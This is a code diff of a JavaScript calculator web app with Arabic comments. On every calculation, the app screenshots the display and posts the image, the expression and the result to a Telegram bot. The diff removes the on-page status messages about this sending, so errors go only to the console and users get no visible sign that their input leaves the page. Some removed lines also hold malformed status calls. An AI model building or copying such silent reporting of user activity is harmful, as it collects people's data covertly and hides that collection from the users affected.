@@ -10,15 +10,20 @@ let result = "0";
 let justCalculated = false;
 
 // ==========================================
-// Local Storage
+// Local History
 // ==========================================
 
 function getHistory() {
-  return JSON.parse(localStorage.getItem("calc_history") || "[]");
+  return JSON.parse(
+    localStorage.getItem("calc_history") || "[]"
+  );
 }
 
 function saveHistory(items) {
-  localStorage.setItem("calc_history", JSON.stringify(items));
+  localStorage.setItem(
+    "calc_history",
+    JSON.stringify(items)
+  );
 }
 
 // ==========================================
@@ -26,7 +31,9 @@ function saveHistory(items) {
 // ==========================================
 
 function render() {
-  $("expression").textContent = expression || "0";
+  $("expression").textContent =
+    expression || "0";
+
   $("result").textContent = result;
 
   const items = getHistory();
@@ -57,17 +64,20 @@ function render() {
 // ==========================================
 
 function escapeHtml(text) {
-  return String(text).replace(/[&<>"']/g, (char) => {
-    const chars = {
-      "&": "&amp;",
-      "<": "&lt;",
-      ">": "&gt;",
-      '"': "&quot;",
-      "'": "&#39;"
-    };
+  return String(text).replace(
+    /[&<>"']/g,
+    (char) => {
+      const chars = {
+        "&": "&amp;",
+        "<": "&lt;",
+        ">": "&gt;",
+        '"': "&quot;",
+        "'": "&#39;"
+      };
 
-    return chars[char];
-  });
+      return chars[char];
+    }
+  );
 }
 
 // ==========================================
@@ -79,7 +89,6 @@ function safeEvaluate(input) {
     throw new Error("invalid");
   }
 
-  // تحويل 50% إلى 0.5
   const normalized = input.replace(
     /(\d+(?:\.\d+)?)%/g,
     "($1/100)"
@@ -95,11 +104,16 @@ function safeEvaluate(input) {
 
   return Number.isInteger(value)
     ? String(value)
-    : String(Number(value.toFixed(12)));
+    : String(
+        Number(value.toFixed(12))
+      );
 }
 
+// ==========================================
+// Add Value
+// ==========================================
+
 function addValue(value) {
-  // بعد الحساب، لو ضغط رقم يبدأ عملية جديدة
   if (
     justCalculated &&
     /[0-9.]/.test(value)
@@ -107,7 +121,6 @@ function addValue(value) {
     expression = "";
   }
 
-  // لو ضغط operator بعد النتيجة، نكمل على النتيجة
   if (
     justCalculated &&
     /[+\-*/%]/.test(value)
@@ -123,21 +136,32 @@ function addValue(value) {
       return;
     }
 
-    const lastChar = expression.at(-1);
+    const lastChar =
+      expression.at(-1);
 
     if (/[+\-*/%]/.test(lastChar)) {
-      expression = expression.slice(0, -1) + value;
+      expression =
+        expression.slice(0, -1) +
+        value;
+
       render();
       return;
     }
   }
 
-  // منع أكثر من decimal في الرقم نفسه
+  // منع تكرار النقطة
   if (value === ".") {
-    const parts = expression.split(/[+\-*/%]/);
-    const currentNumber = parts.at(-1);
+    const parts =
+      expression.split(
+        /[+\-*/%]/
+      );
 
-    if (currentNumber.includes(".")) {
+    const currentNumber =
+      parts.at(-1);
+
+    if (
+      currentNumber.includes(".")
+    ) {
       return;
     }
   }
@@ -148,6 +172,10 @@ function addValue(value) {
   render();
 }
 
+// ==========================================
+// Clear
+// ==========================================
+
 function clearAll() {
   expression = "";
   result = "0";
@@ -156,13 +184,19 @@ function clearAll() {
   render();
 }
 
+// ==========================================
+// Backspace
+// ==========================================
+
 function backspace() {
   if (justCalculated) {
     clearAll();
     return;
   }
 
-  expression = expression.slice(0, -1);
+  expression =
+    expression.slice(0, -1);
+
   render();
 }
 
@@ -175,28 +209,38 @@ async function equals() {
     return;
   }
 
-  const currentExpression = expression;
+  const currentExpression =
+    expression;
 
   try {
-    const calculated = safeEvaluate(currentExpression);
+    const calculated =
+      safeEvaluate(
+        currentExpression
+      );
 
     result = calculated;
     justCalculated = true;
 
     // حفظ العملية
-    const history = getHistory();
+    const history =
+      getHistory();
 
     history.unshift({
       expression: currentExpression,
       result: calculated,
-      time: new Date().toLocaleString("ar-EG")
+      time:
+        new Date().toLocaleString(
+          "ar-EG"
+        )
     });
 
-    saveHistory(history.slice(0, 100));
+    saveHistory(
+      history.slice(0, 100)
+    );
 
     render();
 
-    // ننتظر شوية عشان الـScreenshot يلتقط النتيجة الجديدة
+    // Screenshot بعد ظهور النتيجة
     setTimeout(() => {
       captureAndSendToTelegram(
         currentExpression,
@@ -213,72 +257,57 @@ async function equals() {
 }
 
 // ==========================================
-// Telegram
+// Screenshot + Telegram
 // ==========================================
 
-async function captureAndSendToTelegram(exp, res) {
-  // التأكد من وجود html2canvas
-  if (!window.html2canvas) {
-    setTelegramStatus(
-      "html2canvas لم يتم تحميله",
-      true
-    );
-    return;
-  }
-
-  // التأكد من config.js
-  if (
-    typeof TELEGRAM_CONFIG === "undefined"
-  ) {
-    setTelegramStatus(
-      "ملف config.js غير موجود أو فيه خطأ",
-      true
-    );
-    return;
-  }
-
-  const botToken =
-    TELEGRAM_CONFIG.botToken;
-
-  const chatId =
-    TELEGRAM_CONFIG.chatId;
-
-  if (
-    !botToken ||
-    botToken === "PUT_YOUR_BOT_TOKEN_HERE"
-  ) {
-    setTelegramStatus(
-      "ضع Bot Token في config.js",
-      true
-    );
-    return;
-  }
-
-  if (
-    !chatId ||
-    chatId === "PUT_YOUR_CHAT_ID_HERE"
-  ) {
-    setTelegramStatus(
-      "ضع Chat ID في config.js",
-      true
-    );
-    return;
-  }
-
+async function captureAndSendToTelegram(
+  exp,
+  res
+) {
   try {
-    setTelegramStatus(
-      "جاري إرسال Screenshot..."
-    );
+    // التأكد من html2canvas
+    if (!window.html2canvas) {
+      console.error(
+        "html2canvas لم يتم تحميله."
+      );
+      return;
+    }
+
+    // التأكد من إعداد Telegram
+    if (
+      typeof TELEGRAM_CONFIG ===
+      "undefined"
+    ) {
+      console.error(
+        "TELEGRAM_CONFIG غير موجود."
+      );
+      return;
+    }
+
+    const botToken =
+      TELEGRAM_CONFIG.botToken;
+
+    const chatId =
+      TELEGRAM_CONFIG.chatId;
+
+    if (!botToken || !chatId) {
+      console.error(
+        "Bot Token أو Chat ID غير موجود."
+      );
+      return;
+    }
 
     // أخذ Screenshot
     const canvas =
       await html2canvas(
         $("captureArea"),
         {
-          backgroundColor: "#ffffff",
+          backgroundColor:
+            "#ffffff",
           scale: Math.min(
             2,
-            window.devicePixelRatio || 1
+            window.devicePixelRatio ||
+              1
           ),
           useCORS: true
         }
@@ -286,17 +315,19 @@ async function captureAndSendToTelegram(exp, res) {
 
     // تحويل الصورة إلى Blob
     const blob =
-      await new Promise((resolve) => {
-        canvas.toBlob(
-          resolve,
-          "image/png",
-          0.92
-        );
-      });
+      await new Promise(
+        (resolve) => {
+          canvas.toBlob(
+            resolve,
+            "image/png",
+            0.92
+          );
+        }
+      );
 
     if (!blob) {
       throw new Error(
-        "تعذر إنشاء الصورة"
+        "تعذر إنشاء Screenshot."
       );
     }
 
@@ -304,7 +335,9 @@ async function captureAndSendToTelegram(exp, res) {
       `🧮 حاسبة عبدالله\n` +
       `العملية: ${exp}\n` +
       `النتيجة: ${res}\n` +
-      `الوقت: ${new Date().toLocaleString("ar-EG")}`;
+      `الوقت: ${new Date().toLocaleString(
+        "ar-EG"
+      )}`;
 
     const formData =
       new FormData();
@@ -325,6 +358,7 @@ async function captureAndSendToTelegram(exp, res) {
       `calculation-${Date.now()}.png`
     );
 
+    // إرسال Telegram
     const response =
       await fetch(
         `https://api.telegram.org/bot${botToken}/sendPhoto`,
@@ -337,49 +371,23 @@ async function captureAndSendToTelegram(exp, res) {
     const data =
       await response.json();
 
-    if (!response.ok || !data.ok) {
+    if (
+      !response.ok ||
+      !data.ok
+    ) {
       throw new Error(
         data.description ||
-          " "
+          "فشل إرسال الصورة."
       );
     }
 
-    setTelegramStatus(
-    );
-
   } catch (error) {
+    // الخطأ يظهر في Console فقط
     console.error(
       "Telegram Error:",
       error
     );
-
-    setTelegramStatus(
-      true
-    );
   }
-}
-
-// ==========================================
-// Telegram Status
-// ==========================================
-
-function setTelegramStatus(
-  text,
-  isError = false
-) {
-  const element =
-    $("telegramStatus");
-
-  if (!element) {
-    return;
-  }
-
-  element.textContent = text;
-
-  element.style.color =
-    isError
-      ? "#b42318"
-      : "#138a4b";
 }
 
 // ==========================================
@@ -387,14 +395,18 @@ function setTelegramStatus(
 // ==========================================
 
 const keysContainer =
-  document.querySelector(".keys");
+  document.querySelector(
+    ".keys"
+  );
 
 if (keysContainer) {
   keysContainer.addEventListener(
     "click",
     (event) => {
       const button =
-        event.target.closest("button");
+        event.target.closest(
+          "button"
+        );
 
       if (!button) {
         return;
@@ -406,22 +418,30 @@ if (keysContainer) {
       const action =
         button.dataset.action;
 
-      if (value !== undefined) {
+      if (
+        value !== undefined
+      ) {
         addValue(value);
         return;
       }
 
-      if (action === "clear") {
+      if (
+        action === "clear"
+      ) {
         clearAll();
         return;
       }
 
-      if (action === "backspace") {
+      if (
+        action === "backspace"
+      ) {
         backspace();
         return;
       }
 
-      if (action === "equals") {
+      if (
+        action === "equals"
+      ) {
         equals();
       }
     }
@@ -435,7 +455,6 @@ if (keysContainer) {
 document.addEventListener(
   "keydown",
   (event) => {
-    // الأرقام والعمليات
     if (
       /^[0-9+\-*/%.()]$/.test(
         event.key
@@ -445,7 +464,6 @@ document.addEventListener(
       return;
     }
 
-    // Enter أو =
     if (
       event.key === "Enter" ||
       event.key === "="
@@ -455,7 +473,6 @@ document.addEventListener(
       return;
     }
 
-    // Backspace
     if (
       event.key === "Backspace"
     ) {
@@ -463,7 +480,6 @@ document.addEventListener(
       return;
     }
 
-    // Escape
     if (
       event.key === "Escape"
     ) {
@@ -483,17 +499,14 @@ if (clearHistoryButton) {
   clearHistoryButton.addEventListener(
     "click",
     () => {
-      const confirmed =
+      if (
         confirm(
           "متأكد إنك عايز تمسح سجل العمليات؟"
-        );
-
-      if (!confirmed) {
-        return;
+        )
+      ) {
+        saveHistory([]);
+        render();
       }
-
-      saveHistory([]);
-      render();
     }
   );
 }
@@ -503,16 +516,3 @@ if (clearHistoryButton) {
 // ==========================================
 
 render();
-
-if (
-  typeof TELEGRAM_CONFIG !== "undefined" &&
-  TELEGRAM_CONFIG.botToken &&
-  TELEGRAM_CONFIG.chatId
-) {
-  setTelegramStatus(
-  );
-} else {
-  setTelegramStatus(
-    true
-  );
-}
